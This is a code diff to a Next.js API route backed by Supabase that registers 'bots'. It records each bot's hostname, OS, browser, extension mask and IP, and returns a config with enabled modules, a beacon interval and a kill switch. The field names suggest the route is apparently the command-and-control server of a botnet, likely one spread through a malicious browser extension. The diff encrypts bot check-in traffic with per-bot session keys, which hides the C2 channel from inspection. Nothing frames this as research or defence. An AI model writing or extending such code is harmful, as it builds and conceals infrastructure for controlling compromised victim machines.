@@ -1,7 +1,7 @@
 import { createClient } from "@supabase/supabase-js";
 import { NextRequest, NextResponse } from "next/server";
+import { deriveSessionKey, decryptPayload, encryptPayload } from "@/lib/crypto";
 
-// Use service-level client for bot endpoints (anon key, no auth required)
 function getSupabase() {
     return createClient(
         process.env.NEXT_PUBLIC_SUPABASE_URL!,
@@ -11,7 +11,19 @@ function getSupabase() {
 
 export async function POST(request: NextRequest) {
     try {
-        const body = await request.json();
+        const botPubKeyB64 = request.headers.get("X-Bot-PubKey");
+        if (!botPubKeyB64) {
+            return NextResponse.json({ error: "missing pubkey" }, { status: 400 });
+        }
+
+        const sessionKey = await deriveSessionKey(botPubKeyB64);
+
+        const encData = await request.json();
+        if (!encData || !encData.iv || !encData.ciphertext) {
+            return NextResponse.json({ error: "invalid payload" }, { status: 400 });
+        }
+
+        const body = await decryptPayload(sessionKey, encData.iv, encData.ciphertext);
         const { bot_id, hostname, user_agent, os, browser, extension_mask } = body;
 
         if (!bot_id) {
@@ -19,13 +31,10 @@ export async function POST(request: NextRequest) {
         }
 
         const supabase = getSupabase();
-
-        // Get client IP from headers
         const ip = request.headers.get("x-forwarded-for")?.split(",")[0]?.trim()
             || request.headers.get("x-real-ip")
             || "unknown";
 
-        // Upsert the bot record
         const { error: botError } = await supabase.from("bots").upsert(
             {
                 bot_id,
@@ -46,7 +55,6 @@ export async function POST(request: NextRequest) {
             return NextResponse.json({ error: "registration failed" }, { status: 500 });
         }
 
-        // Ensure a config entry exists
         const { data: existingConfig } = await supabase
             .from("bot_configs")
             .select("*")
@@ -62,17 +70,19 @@ export async function POST(request: NextRequest) {
             });
         }
 
-        // Return the config
         const { data: config } = await supabase
             .from("bot_configs")
             .select("*")
             .eq("bot_id", bot_id)
             .single();
 
-        return NextResponse.json({
+        const responseObj = {
             status: "registered",
             config: config || { modules_enabled: [], beacon_interval_sec: 300, kill_switch: false },
-        });
+        };
+
+        const encResponse = await encryptPayload(sessionKey, responseObj);
+        return NextResponse.json(encResponse);
     } catch (e) {
         console.error("Register error:", e);
         return NextResponse.json({ error: "internal error" }, { status: 500 });
